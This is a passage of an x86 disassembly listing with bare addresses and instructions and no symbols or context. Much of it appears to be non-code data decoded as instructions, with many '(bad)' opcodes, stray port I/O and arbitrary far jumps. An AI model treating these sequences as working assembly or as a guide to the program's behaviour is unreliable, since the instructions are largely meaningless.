  4178d4:	hlt    
  4178d5:	ins    DWORD PTR es:[edi],dx
  4178d6:	popa   
  4178d7:	jecxz  0x4178b2
  4178d9:	pop    edx
  4178da:	jbe    0x4178cb
  4178dc:	or     BYTE PTR [ecx+0x65],dh
  4178df:	mov    esi,0xa77073de
  4178e4:	adc    eax,0xc3a72cdd
  4178e9:	xor    eax,0xdd053774
  4178ee:	sub    al,0xa7
  4178f0:	shl    DWORD PTR ds:0xe76c3774,cl
  4178f6:	sub    al,0xd0
  4178f8:	cdq    
  4178f9:	dec    ebp
  4178fa:	inc    ebp
  4178fb:	or     BYTE PTR [ecx+0x660a6c26],dl
  417901:	inc    edx
  417902:	push   0x63208115
  417907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417908:	push   ebp
  417909:	inc    edx
  41790a:	push   0x0
	...
  41791f:	add    ch,dh
  417921:	nop
  417922:	and    BYTE PTR [edi-0x6],ah
  417925:	jbe    0x417928
  417927:	pop    esp
  417928:	in     al,0x81
  41792a:	das    
  41792b:	ins    DWORD PTR es:[edi],dx
  41792c:	sar    BYTE PTR [esi+0x51],cl
  41792f:	ins    BYTE PTR es:[edi],dx
  417930:	ror    BYTE PTR [esp+eax*1+0x51],cl
  417934:	sar    BYTE PTR [edi],0x38
  417937:	jne    0x4178ff
  417939:	dec    ebx
  41793a:	daa    
  41793b:	pop    esp
  41793c:	in     al,0x41
  41793e:	xor    ch,BYTE PTR [ebp-0x36]
  417941:	ss push esp
  417943:	ins    BYTE PTR es:[edi],dx
  417944:	mov    edx,0xb94703ec
  417949:	in     al,dx
  41794a:	aaa    
  41794b:	pop    edi
  41794c:	xchg   ebx,eax
  41794d:	in     eax,0x4c
  41794f:	inc    esp
  417950:	mov    cs,WORD PTR [ebx]
  417952:	add    al,0x5c
  417954:	or     ebx,DWORD PTR gs:0x1f067e6b
  41795b:	add    BYTE PTR [ebx+0x7],ah
  41795e:	sbb    esp,DWORD PTR [ecx-0x71]
  417961:	stos   DWORD PTR es:[edi],eax
  417962:	push   ds
  417963:	imul   ecx,DWORD PTR [edx+0x78414d99],0xfffffffe
  41796a:	sbb    al,0x64
  41796c:	push   eax
  41796d:	cdq    
  41796e:	dec    ebp
  41796f:	push   edx
  417970:	dec    eax
  417971:	add    cl,dl
  417973:	sbb    bl,BYTE PTR [ebp+ebx*1-0x35]
  417977:	aaa    
  417978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417979:	cmp    eax,DWORD PTR [ecx+eax*2]
  41797c:	inc    esp
  41797d:	push   ss
  41797e:	les    ebx,FWORD PTR [esi]
  417980:	dec    ecx
  417981:	add    ah,BYTE PTR [ebx+0x3a]
	...
  417997:	add    BYTE PTR [eax],al
  417999:	jl     0x4179d0
  41799b:	les    ebx,FWORD PTR [edi]
  41799d:	inc    esp
  41799e:	pop    ss
  41799f:	lds    eax,FWORD PTR [ebx]
  4179a1:	add    edx,DWORD PTR [ebx-0x47]
  4179a4:	push   ds
  4179a5:	add    DWORD PTR [edx],ebx
  4179a7:	xchg   ebx,eax
  4179a8:	sub    BYTE PTR [esi],dl
  4179aa:	add    esp,DWORD PTR [ebx+esi*1+0x4fe72400]
  4179b1:	in     al,0x32
  4179b3:	and    BYTE PTR [edx],0xdb
  4179b6:	cmp    eax,0x3061c77
  4179bb:	call   0xeae0:0x8d20c837
  4179c2:	dec    esi
  4179c3:	xchg   edi,eax
  4179c4:	add    edx,esi
  4179c6:	sbb    DWORD PTR [ebx+0x27],ebx
  4179c9:	(bad)  
  4179ca:	fmul   DWORD PTR [edi+0x1e]
  4179cd:	rol    BYTE PTR [edx],0x33
  4179d0:	push   ecx
  4179d1:	enter  0x442e,0x31
  4179d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179d6:	inc    esi
  4179d7:	sbb    eax,0x4a19b61b
  4179dc:	sbb    eax,0x2723e2bc
  4179e1:	mov    ebx,DWORD PTR [ecx]
  4179e3:	dec    eax
  4179e4:	add    al,0xc9
  4179e6:	and    BYTE PTR [ebx],bl
  4179e8:	xor    al,0xa7
  4179ea:	push   ebx
  4179eb:	out    0x26,eax
  4179ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179ee:	cs out 0x37,eax
  4179f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f2:	sbb    edi,esp
  4179f4:	sbb    eax,0x30e71fa7
  4179f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179fa:	add    ah,bh
  4179fc:	dec    edi
	...
  417a11:	add    BYTE PTR [edx+0x16],ah
  417a14:	add    BYTE PTR [esi],al
  417a16:	test   DWORD PTR [edi+0x6c],eax
  417a19:	leave  
  417a1a:	pusha  
  417a1b:	adc    eax,0x15b0d775
  417a20:	pop    edi
  417a21:	lds    eax,FWORD PTR [ecx-0x7e45ffcc]
  417a27:	fcomp  DWORD PTR [esi-0x25]
  417a2a:	xchg   DWORD PTR [edx],ebx
  417a2c:	add    BYTE PTR [edi-0x2e8edc8a],ch
  417a32:	bound  ecx,QWORD PTR [esi+0x50]
  417a35:	jmp    0xa78ccdbc
  417a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a3b:	inc    eax
  417a3c:	ins    BYTE PTR es:[edi],dx
  417a3d:	mov    BYTE PTR [esi-0x2b6ab9df],bh
  417a43:	add    dh,BYTE PTR [ecx-0x80]
  417a46:	mov    eax,0xc5852e21
  417a4b:	add    BYTE PTR cs:[ebp-0x668bcc3b],dh
  417a52:	lds    esi,FWORD PTR [ebx]
  417a54:	jno    0x417ad4
  417a56:	ret    
  417a57:	xor    BYTE PTR [ecx+ebp*8-0x68],ah
  417a5b:	inc    ebp
  417a5c:	jno    0x417abb
  417a5e:	in     al,0x1e
  417a60:	fs pop ebx
  417a62:	xor    BYTE PTR [ebx],0x71
  417a65:	jmp    0x55b2bfea
  417a6a:	shl    BYTE PTR [ebx],1
  417a6c:	arpl   WORD PTR [ebx],di
  417a6e:	stos   DWORD PTR es:[edi],eax
  417a6f:	ss pop edi
  417a71:	cmp    ch,BYTE PTR [edi+0x52]
  417a74:	ins    DWORD PTR es:[edi],dx
  417a75:	cmp    eax,DWORD PTR [eax]
	...
  417a8b:	fild   WORD PTR [edx]
  417a8d:	push   ecx
  417a8e:	shr    DWORD PTR ds:[esi],0x75
  417a92:	or     ch,dl
  417a94:	and    DWORD PTR [edi+eiz*1-0x39],ebx
  417a98:	inc    ebp
  417a99:	jno    0x417a9c
  417a9b:	pop    ebx
  417a9c:	and    DWORD PTR [edi+0x2],ebx
  417a9f:	push   edi
  417aa0:	inc    eax
  417aa1:	ins    BYTE PTR es:[edi],dx
  417aa2:	add    BYTE PTR [edi-0xdb99f28],bl
  417aa8:	icebp  
  417aa9:	pop    ebx
  417aaa:	push   ebx
  417aab:	mov    bl,0xea
  417aad:	jae    0x417b18
  417aaf:	fcomp  st(6)
  417ab1:	outs   dx,BYTE PTR ds:[esi]
  417ab2:	add    dl,ch
  417ab4:	inc    ebx
  417ab5:	ins    BYTE PTR es:[edi],dx
  417ab6:	popa   
  417ab7:	(bad)  
  417ab8:	fadd   QWORD PTR [ebp+0x74]
  417abb:	fiadd  WORD PTR [ecx]
  417abd:	data16 fiadd WORD PTR cs:0x52124600
  417ac5:	daa    
  417ac6:	sub    ebx,DWORD PTR [eax+0x656e6542]
  417acc:	xor    eax,0x563686f
  417ad1:	ins    BYTE PTR es:[edi],dx
  417ad2:	pop    esp
  417ad3:	cmp    ecx,esi
  417ad5:	pusha  
  417ad6:	outs   dx,BYTE PTR ds:[esi]
  417ad7:	dec    edx
  417ad8:	loop   0x417b44
  417ada:	ins    DWORD PTR es:[edi],dx
  417adb:	sub    esp,eax
  417add:	ins    DWORD PTR es:[edi],dx
  417ade:	mov    ?,WORD PTR fs:[esi]
  417ae1:	imul   eax,DWORD PTR [esi+0x12],0x51
  417ae5:	add    BYTE PTR [ebx+0x19],al
  417ae8:	pop    es
  417ae9:	outs   dx,BYTE PTR ds:[esi]
  417aea:	gs sub eax,0x6f64ed
	...
  417b04:	fdiv   st,st(2)
  417b06:	sub    eax,0xfff2c674
  417b0b:	xor    al,BYTE PTR [edx+0x7e5443cb]
  417b11:	(bad)  
  417b12:	outs   dx,BYTE PTR ds:[esi]
  417b13:	imul   edx,edx,0xd72e6ee3
  417b19:	or     BYTE PTR [ebp+0x0],ah
  417b1c:	mov    ch,BYTE PTR [ebp+0x52d02d41]
  417b22:	push   eax
  417b23:	add    BYTE PTR [edx-0x5c8b9ab3],ch
  417b29:	inc    edx
  417b2a:	popa   
  417b2b:	jae    0x417ae4
  417b2d:	loope  0x417b9c
  417b2f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  417b31:	or     DWORD PTR [ecx+edx*2],eax
  417b34:	push   0x66554fdd
  417b39:	or     DWORD PTR [edi],edi
  417b3b:	pop    esp
  417b3c:	mul    DWORD PTR fs:[edx]
  417b3f:	jno    0x417b95
  417b41:	div    BYTE PTR [esp+ebx*2]
  417b44:	jae    0x417af8
  417b46:	xor    DWORD PTR [ebx+0x63],esp
  417b49:	shl    BYTE PTR [ebx],cl
  417b4b:	pop    esp
  417b4c:	dec    esp
  417b4d:	pop    ebp
  417b4e:	in     al,dx
  417b4f:	das    
  417b50:	jnp    0x417b5a
  417b52:	inc    ebp
  417b53:	cmp    BYTE PTR [edi-0x5a],bh
  417b56:	aas    
  417b57:	imul   ebp,DWORD PTR ss:[ecx-0x5588d128],0xa8e62b44
  417b62:	inc    esi
  417b63:	aaa    
  417b64:	retf   0xe9a9
  417b67:	das    
	...
  417b7c:	add    bh,dl
  417b7e:	mov    DWORD PTR [ebx+0x32],0x45eccde1
  417b85:	in     eax,0x8e
  417b87:	inc    ebp
  417b88:	das    
  417b89:	leave  
  417b8a:	mov    DWORD PTR [ebp+0x30],0x6e1c24d3
  417b91:	mov    ah,0x67
  417b93:	add    DWORD PTR [ebx-0x3a],eax
  417b96:	sub    BYTE PTR [esi+eax*2],ch
  417b99:	xrelease mov DWORD PTR [ecx],eax
  417b9c:	pop    esp
  417b9d:	loope  0x417bd5
  417b9f:	xor    BYTE PTR [ecx-0x3a],dl
  417ba2:	inc    edi
  417ba3:	and    ebp,DWORD PTR [esi-0x38]
  417ba6:	cdq    
  417ba7:	xlat   BYTE PTR ds:[ebx]
  417ba8:	ja     0x417b6b
  417baa:	dec    ecx
  417bab:	add    al,0x2e
  417bad:	mov    ch,0x35
  417baf:	xor    al,0x0
  417bb1:	rcr    esi,cl
  417bb3:	push   ebp
  417bb4:	dec    ebx
  417bb5:	je     0x417bbe
  417bb7:	push   edx
  417bb8:	sub    eax,0x5f3199cd
  417bbd:	xchg   esp,eax
  417bbe:	add    bl,BYTE PTR [edx]
  417bc0:	xor    edi,DWORD PTR [edx+0x30]
  417bc3:	add    esp,esp
  417bc5:	mov    ch,0xf1
  417bc7:	shl    BYTE PTR ds:0x371402bd,1
  417bcd:	test   BYTE PTR [eax],dh
  417bcf:	adc    eax,0xc11d7c25
  417bd4:	ss popf 
  417bd6:	add    cl,BYTE PTR ds:0xc7164b31
  417bdc:	and    al,0x4b
  417bde:	push   ds
  417bdf:	fldenv [eax]
	...
  417bf5:	add    BYTE PTR [esi+0x2f],dl
  417bf8:	and    DWORD PTR [edi],esi
  417bfa:	jge    0x417bfe
  417bfc:	add    eax,0xb93d5304
  417c01:	cmp    BYTE PTR [esi+0x50],dl
  417c04:	popf   
  417c05:	fisubr DWORD PTR [eax-0x38ac6cc3]
  417c0b:	xor    al,0xc6
  417c0d:	xor    ah,BYTE PTR [edi-0x1eac6cc4]
  417c13:	adc    ebx,DWORD PTR [esi-0x6ce5e9fd]
  417c19:	and    dh,dh
  417c1b:	aam    0x8e
  417c1d:	sbb    BYTE PTR [ebx],cl
  417c1f:	add    edi,DWORD PTR [edx-0x61b116c6]
  417c25:	inc    esp
  417c26:	aad    0x3d
  417c28:	fwait
  417c29:	push   ebp
  417c2a:	shl    BYTE PTR [eax],cl
  417c2c:	xchg   al,bl
  417c2e:	loop   0x417c7e
  417c30:	xchg   edi,eax
  417c31:	jecxz  0x417bca
  417c33:	aam    0x1d
  417c35:	dec    eax
  417c36:	neg    BYTE PTR [edi]
  417c38:	pop    ecx
  417c39:	sbb    esi,DWORD PTR [edi-0x29fba5d2]
  417c3f:	xor    esp,DWORD PTR ds:0x1941da50
  417c45:	aas    
  417c46:	retf   
  417c47:	push   eax
  417c48:	dec    esi
  417c49:	es xchg edx,eax
  417c4b:	aad    0xff
  417c4d:	cs ja  0x417ca2
  417c50:	and    dl,bh
  417c52:	out    dx,al
  417c53:	in     eax,dx
  417c54:	pop    ebx
  417c55:	das    
  417c56:	ja     0x417caa
  417c58:	push   ecx
  417c59:	add    al,0x0
	...
  417c6f:	mov    ecx,0xb21b632c
  417c74:	add    al,BYTE PTR [esi+0x35]
  417c77:	pop    ebx
  417c78:	loop   0x417cba
  417c7a:	push   ss
  417c7b:	mov    eax,0x66e97414
  417c80:	dec    esi
  417c81:	push   eax
  417c82:	leave  
  417c83:	sbb    bp,WORD PTR [esp+eax*1-0x10]
  417c88:	push   ds
  417c89:	add    BYTE PTR [ecx-0x298ece7b],bh
  417c8f:	lahf   
  417c90:	xor    BYTE PTR [ecx+ebp*8+0x53],ah
  417c94:	pop    ds
  417c95:	jb     0x417c6e
  417c97:	xchg   ecx,eax
  417c98:	xor    BYTE PTR [esi-0x38],cl
  417c9b:	xchg   ecx,eax
  417c9c:	pop    ds
  417c9d:	add    BYTE PTR [ebx+ebx*8-0x275f8ddb],dl
  417ca4:	add    al,BYTE PTR [edi-0x41]
  417ca7:	lods   eax,DWORD PTR ds:[esi]
  417ca8:	push   ss
  417ca9:	mov    BYTE PTR [bx+si+0x6746],dh
  417cae:	fwait
  417caf:	mov    eax,ds:0xb2867423
  417cb4:	sbb    DWORD PTR [eax],eax
  417cb6:	mov    ecx,0xb774148f
  417cbb:	mov    ecx,0x9a84622d
  417cc0:	add    dl,BYTE PTR [ecx-0x74]
  417cc3:	xchg   edx,eax
  417cc4:	sbb    BYTE PTR [ebx+0x7b],ah
  417cc7:	loopne 0x417ce2
  417cc9:	jo     0x417d17
  417ccb:	mov    ds:0xa4e8fff2,eax
  417cd0:	fs inc ebp
  417cd2:	sub    BYTE PTR [eax],al
	...
  417ce8:	mov    ds:0x8978632c,eax
  417ced:	and    DWORD PTR [ebp+0x0],eax
  417cf0:	jb     0x417cad
  417cf2:	mov    bl,0xd9
  417cf4:	or     DWORD PTR [esi],esp
  417cf6:	clc    
  417cf7:	in     eax,0x3d
  417cf9:	in     al,0x48
  417cfb:	pop    ecx
  417cfc:	(bad)  
  417cfd:	xchg   edi,eax
  417cfe:	sub    esi,DWORD PTR ds:0x2e3697f0
  417d04:	fst    QWORD PTR [edx+0x4042ffd]
  417d0a:	or     BYTE PTR [ebx],ch
  417d0c:	or     BYTE PTR ds:0x6f90501,al
  417d12:	(bad)  
  417d13:	(bad)  
  417d14:	mov    ebp,0xd97465fb
  417d19:	in     al,0x71
  417d1b:	mov    gs:0xdf6e64da,al
  417d21:	(bad)  
  417d22:	inc    ebp
  417d23:	push   esp
  417d24:	dec    BYTE PTR [ecx+0x4f]
  417d27:	imul   ebx,edx,0xdf4d2000
  417d2d:	sti    
  417d2e:	pop    esp
  417d2f:	addr16 fcmovnbe st,st(7)
  417d32:	inc    DWORD PTR [edi+0x71]
  417d35:	(bad)  
  417d36:	jae    0x417d38
  417d38:	cmp    edx,esi
  417d3a:	pusha  
  417d3b:	jb     0x417dbb
  417d3d:	xor    eax,0x52d735d
  417d42:	push   eax
  417d43:	outs   dx,DWORD PTR ds:[esi]
  417d44:	sbb    al,0xf1
  417d46:	call   DWORD PTR [ecx+0x2b]
  417d49:	clc    
  417d4a:	push   0x74
	...
  417d60:	add    BYTE PTR [ebx],ch
  417d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d63:	inc    ecx
  417d64:	imul   ebp,esp,0x27435c05
  417d6a:	out    0x60,eax
  417d6c:	jb     0x417d98
  417d6e:	lock pop esi
  417d70:	imul   edi,DWORD PTR [esi],0xffffffbb
  417d73:	popa   
  417d74:	jne    0x417d53
  417d76:	std    
  417d77:	push   DWORD PTR [ebp+ebx*8-0x1d]
  417d7b:	jno    0x417dab
  417d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d7e:	dec    esp
  417d7f:	adc    eax,0x1d42c96e
  417d84:	add    BYTE PTR [ebx-0x24],ch
  417d87:	push   ds
  417d88:	je     0x417d25
  417d8a:	xor    dl,BYTE PTR [esi]
  417d8c:	gs (bad) 
  417d8e:	dec    ecx
  417d8f:	and    ebp,DWORD PTR [ebx-0x76]
  417d92:	scas   al,BYTE PTR es:[edi]
  417d93:	(bad)  
  417d95:	(bad)  
  417d96:	stos   DWORD PTR es:[edi],eax
  417d97:	sub    ebx,DWORD PTR [edi-0x6d]
  417d9a:	neg    BYTE PTR [esi]
  417d9c:	cmp    eax,ebp
  417d9e:	stos   DWORD PTR es:[edi],eax
  417d9f:	push   edx
  417da0:	ins    DWORD PTR es:[edi],dx
  417da1:	mov    edi,esi
  417da3:	sub    al,0x5f
  417da5:	jne    0x417db5
  417da7:	dec    eax
  417da8:	push   ecx
  417da9:	dec    esi
  417daa:	push   cs
  417dab:	adc    eax,0x300a736e
  417db0:	push   0x50459e46
  417db5:	push   edx
  417db6:	pop    edi
  417db7:	dec    ebp
  417db8:	push   edi
  417db9:	arpl   WORD PTR [eax+eiz*1+0x71],bx
  417dbd:	xor    al,0xc2
  417dbf:	push   ss
  417dc0:	outs   dx,BYTE PTR ds:[esi]
  417dc1:	xor    al,0xab
  417dc3:	cmp    DWORD PTR [ebp+0x0],ebp
	...
  417dda:	xor    al,0x5f
  417ddc:	xor    ebx,DWORD PTR [edi+0x12]
  417ddf:	mov    DWORD PTR [ecx],0x2fcf1453
  417de5:	dec    esi
  417de6:	push   es
  417de7:	pop    edi
  417de8:	and    BYTE PTR [eax],al
  417dea:	test   DWORD PTR [edx-0x6f078ece],0x59a7642f
  417df4:	push   ss
  417df5:	jb     0x417df2
  417df7:	jg     0x417e29
  417df9:	imul   eax,DWORD PTR ds:0xfb002f8f,0xffffff86
  417e00:	das    
  417e01:	imul   ecx,esi,0xffffff87
  417e04:	and    al,0x6c
  417e06:	sti    
  417e07:	adc    dh,BYTE PTR [ecx]
  417e09:	arpl   WORD PTR [edi-0x48cbcafe],sp
  417e0f:	dec    eax
  417e10:	xor    edx,DWORD PTR [ecx+ecx*4+0x1a]
  417e14:	inc    esp
  417e15:	sbb    BYTE PTR [edi-0x4ce8e2c2],ah
  417e1b:	and    eax,0xeb8b2537
  417e20:	adc    DWORD PTR [esi+esi*2],eax
  417e23:	das    
  417e24:	dec    ebp
  417e25:	xor    BYTE PTR [edx+0x6b213921],bl
  417e2b:	inc    ebx
  417e2c:	push   ss
  417e2d:	push   ds
  417e2e:	mov    DWORD PTR ds:0x12744304,esp
  417e34:	(bad)  
  417e35:	push   edx
  417e36:	sub    BYTE PTR [eax],0x13
  417e39:	das    
  417e3a:	dec    eax
  417e3b:	adc    al,0xc
  417e3d:	add    al,0x0
	...
  417e53:	imul   esi,DWORD PTR [esi],0x2544e417
  417e59:	cli    
  417e5a:	das    
  417e5b:	dec    eax
  417e5c:	xor    BYTE PTR [eax],cl
  417e5e:	xor    BYTE PTR [eax+0x2f],al
  417e61:	aad    0xe3
  417e63:	aaa    
  417e64:	and    eax,0x14442dd9
  417e69:	out    0x3d,eax
  417e6b:	pop    ebx
  417e6c:	xor    al,BYTE PTR [edi]
  417e6e:	and    BYTE PTR [ebx+edx*1-0x45],al
  417e72:	sbb    al,0x11
  417e74:	and    dh,BYTE PTR [ebx+0x7310a1c]
  417e7a:	xor    DWORD PTR [esi],edx
  417e7c:	es mov ecx,0xb736e103
  417e82:	jecxz  0x417e88
  417e84:	es call 0x82f:0x8831002f
  417e8c:	xor    BYTE PTR [ebp-0x1d],bh
  417e8f:	clc    
  417e90:	and    DWORD PTR [edx+0x32],edi
  417e93:	fisubr DWORD PTR [edi]
  417e95:	jns    0x417eb6
  417e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e98:	dec    eax
  417e99:	add    BYTE PTR [ebp-0x7b9c1d0c],bl
  417e9f:	xchg   ebp,eax
  417ea0:	push   ss
  417ea1:	addr16 push edi
  417ea3:	test   BYTE PTR [esi],dl
  417ea5:	addr16 dec esi
  417ea7:	xchg   ecx,eax
  417ea8:	loop   0x417f19
  417eaa:	inc    esi
  417eab:	jne    0x417ec3
  417ead:	add    BYTE PTR [edi],ah
  417eaf:	xlat   BYTE PTR ds:[ebx]
  417eb0:	xor    ah,BYTE PTR [eax]
  417eb2:	dec    ebp
  417eb3:	rcl    BYTE PTR [ecx],0x74
  417eb6:	push   eax
	...
  417ecb:	add    BYTE PTR [ecx-0x45bf8bc1],dh
  417ed1:	xor    BYTE PTR [eax],ah
  417ed3:	dec    edx
  417ed4:	les    edx,FWORD PTR [esi]
  417ed6:	pop    edi
  417ed7:	adc    eax,0x2700259a
  417edc:	push   edi
  417edd:	xor    ah,BYTE PTR [eax]
  417edf:	sbb    DWORD PTR [ebp-0x70ff99d3],esi
  417ee5:	and    esi,DWORD PTR [ecx-0x17]
  417ee8:	mov    ds:0xbb1a5036,al
  417eed:	and    ebp,DWORD PTR [ebp+eax*1-0x55]
  417ef1:	sub    BYTE PTR [ecx+edi*8-0x69],dh
  417ef5:	sub    ah,BYTE PTR [ebx-0x2b]
  417ef8:	cwde   
  417ef9:	lock ficomp DWORD PTR gs:[ebp-0x6d39aefe]
  417f01:	push   ss
  417f02:	jne    0x417ecc
  417f04:	jbe    0x417f29
  417f06:	pop    esp
  417f07:	mov    ah,0xe5
  417f09:	xor    ebp,DWORD PTR [ebx]
  417f0b:	call   0x36d2:0x957424b3
  417f12:	push   eax
  417f13:	mov    al,ds:0xc56d24b2
  417f18:	xlat   BYTE PTR ds:[ebx]
  417f19:	and    DWORD PTR [esp+edx*4-0x4c],esi
  417f1d:	add    al,BYTE PTR [eax+ecx*4-0x40]
  417f21:	cmp    eax,0x2b68044
  417f26:	pop    esp
  417f27:	add    BYTE PTR [eax],dl
  417f29:	dec    esi
  417f2a:	push   eax
  417f2b:	dec    ecx
  417f2c:	sub    BYTE PTR [eax],al
  417f2e:	imul   eax,DWORD PTR [eax],0x0
	...
  417f45:	sub    eax,0x237671fd
  417f4a:	aam    0x4b
  417f4c:	imul   ebx,ebp,0xeb782dd2
  417f52:	cli    
  417f53:	dec    DWORD PTR [ebp-0x1d]
  417f56:	out    dx,al
  417f57:	jo     0x417fcc
  417f59:	cmp    cl,0x6b
  417f5c:	gs push cs
  417f5e:	add    BYTE PTR [eax+esi*2-0x23],dh
  417f62:	stc    
  417f63:	jae    0x417fca
  417f65:	test   al,0xf9
  417f67:	ins    DWORD PTR es:[edi],dx
  417f68:	imul   edi,esi,0xa2735cdf
  417f6e:	xor    esi,DWORD PTR [edi+ebp*2-0x58]
  417f72:	std    
  417f73:	pop    ds
  417f74:	inc    edx
  417f75:	mov    edi,?
  417f77:	jb     0x417fec
  417f79:	mov    ds:0xc245ffd0,eax
  417f7e:	ss dec esp
  417f80:	imul   ebx,ebp,0x9c642ded
  417f86:	push   es
  417f87:	pop    esp
  417f88:	dec    ebp
  417f89:	lahf   
  417f8a:	(bad)  
  417f8b:	imul   esp,DWORD PTR [ebp-0x3],0xffffffed
  417f8f:	jo     0x417ff5
  417f91:	xlat   BYTE PTR ds:[ebx]
  417f92:	neg    BYTE PTR [ebx+0x43]
  417f95:	out    0xd3,al
  417f97:	push   0x6d
  417f99:	jecxz  0x417fcc
  417f9b:	ins    BYTE PTR es:[edi],dx
  417f9c:	jne    0x417ffb
  417f9e:	add    DWORD PTR [edi],esp
  417fa0:	inc    eax
  417fa1:	dec    esi
  417fa2:	add    DWORD PTR [edi+0x61013e44],edi
  417fa8:	inc    esi
	...
  417fbd:	add    BYTE PTR [esi],bh
  417fbf:	add    DWORD PTR [ebx+0x4a],ebx
  417fc2:	dec    esi
  417fc3:	add    ebx,edx
  417fc5:	dec    ebp
  417fc6:	dec    esi
  417fc7:	add    ebp,edi
  417fc9:	dec    edi
  417fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fcb:	imul   eax,DWORD PTR [ecx],0xffffffdd
  417fce:	shr    DWORD PTR [ebx+0x1],cl
  417fd1:	aam    0xfa
  417fd3:	imul   eax,DWORD PTR [ecx],0xffffffde
  417fd6:	icebp  
  417fd7:	imul   eax,DWORD PTR [ecx],0x5b
  417fda:	out    dx,eax
  417fdb:	imul   eax,DWORD PTR [ecx],0x18
  417fde:	out    dx,al
  417fdf:	imul   eax,DWORD PTR [ecx],0x5d
  417fe2:	fsub   st(3),st
  417fe4:	add    esp,eax
  417fe6:	(bad)  
  417fe8:	add    esi,DWORD PTR [edx-0x39]
  417feb:	jmp    0x417ff0
  417fed:	daa    
  417fee:	(bad)  
  417fef:	jmp    0x417ff4
  417ff1:	mov    ah,0x84
  417ff3:	jmp    0x417ff8
  417ff5:	in     eax,dx
  417ff6:	test   bl,ch
  417ff8:	add    esp,DWORD PTR [edi-0x75]
  417ffb:	jmp    0x418000
  417ffd:	jmp    0x417f82
  417fff:	jmp    0x418004
  418001:	lock mov ebx,ebp
  418004:	add    ebx,DWORD PTR [edi]
  418006:	sub    bl,0x3
  418009:	xchg   ecx,eax
  41800a:	jge    0x417ff7
  41800c:	add    ebp,DWORD PTR [ecx+0x7a]
  41800f:	jmp    0x418014
  418011:	xchg   esi,eax
  418012:	push   eax
  418013:	jmp    0x418018
  418015:	xchg   edx,eax
  418016:	push   edi
  418017:	jmp    0x41801c
  418019:	dec    esp
  41801a:	push   esi
  41801b:	jmp    0x418020
  41801d:	dec    ecx
  41801e:	push   ebp
  41801f:	jmp    0x418024
  418021:	jne    0x418023
	...
  418037:	cmp    ebp,DWORD PTR [ebx+0x1]
  41803a:	sbb    BYTE PTR [edi],bh
  41803c:	imul   eax,DWORD PTR [ecx],0x5f
  41803f:	das    
  418040:	imul   eax,DWORD PTR [ecx],0xffffffc7
  418043:	das    
  418044:	imul   eax,DWORD PTR [ecx],0x1c
  418047:	sbb    al,0x6a
  418049:	add    DWORD PTR [ebx+0x1c],esp
  41804c:	push   0x1
  41804e:	dec    ecx
  41804f:	sub    DWORD PTR [edx+0x1],ebp
  418052:	push   ebp
  418053:	push   ds
  418054:	push   0x1
  418056:	and    eax,0x3a7032d
  41805b:	pop    ebp
  41805c:	jne    0x418005
  41805e:	add    edx,eax
  418060:	jae    0x418009
  418062:	add    edx,DWORD PTR [edx+0x4103a77a]
  418068:	jnp    0x418011
  41806a:	add    eax,DWORD PTR [ecx+edi*2+0x7a0303a7]
  418071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418072:	add    ecx,DWORD PTR [edi+0x5d03a778]
  418078:	jns    0x4180a1
  41807a:	add    al,0xdf
  41807c:	ja     0x4180a5
  41807e:	add    al,0xf5
  418080:	ja     0x4180a9
  418082:	add    al,0x3c
  418084:	js     0x4180ad
  418086:	add    al,0xd4
  418088:	data16 daa 
  41808a:	add    al,0xeb
  41808c:	imul   esp,DWORD PTR [edi],0x276a0c04
  418092:	add    al,0x1f
  418094:	pop    eax
  418095:	daa    
  418096:	add    al,0x38
  418098:	pop    eax
  418099:	daa    
  41809a:	add    al,0x0
	...
  4180b0:	or     eax,0x74042758
  4180b5:	pop    esi
  4180b6:	daa    
  4180b7:	add    al,0x41
  4180b9:	pop    edi
  4180ba:	daa    
  4180bb:	add    al,0xfa
  4180bd:	pop    esi
  4180be:	daa    
  4180bf:	add    al,0xaf
  4180c1:	pop    ebp
  4180c2:	daa    
  4180c3:	add    al,0x48
  4180c5:	pop    ebp
  4180c6:	daa    
  4180c7:	add    al,0x61
  4180c9:	pop    esp
  4180ca:	daa    
  4180cb:	add    al,0xd7
  4180cd:	pop    esp
  4180ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180cf:	add    ecx,DWORD PTR ds:0x8603a7c3
  4180d5:	shl    DWORD PTR [edi-0x583ebbfd],0x3
  4180dc:	jl     0x41809f
  4180de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180df:	add    esp,ebx
  4180e1:	mov    edi,0xbf4503a7
  4180e6:	add    BYTE PTR [ecx-0x563c0e5c],ch
  4180ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ed:	in     al,dx
  4180ee:	ret    0xa4a9
  4180f1:	push   0xffffffc3
  4180f3:	test   eax,0xa9c72fa4
  4180f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180f9:	push   0xf6a4a9c7
  4180fe:	retf   0xa4a9
  418101:	sbb    cl,bl
  418103:	test   eax,0xa9cf32a4
  418108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418109:	cmp    ecx,edx
  41810b:	test   eax,0x29d37aa4
  418110:	mov    ds:0x29d3bb,eax
	...
  418129:	stos   DWORD PTR es:[edi],eax
  41812a:	das    
  41812b:	fsubr  DWORD PTR [ecx]
  41812d:	mov    ds:0xab29d87c,eax
  418132:	(bad)  
  418133:	(bad)  
  418134:	sub    DWORD PTR [ebx-0x54d62877],esp
  41813a:	add    ebx,edx
  41813c:	sub    DWORD PTR [ebx-0x54d6257b],esp
  418142:	add    al,BYTE PTR [eax]
  418144:	jmp    0xe94183ed
  418149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41814a:	add    al,BYTE PTR [eax]
  41814c:	jmp    0xe94183f5
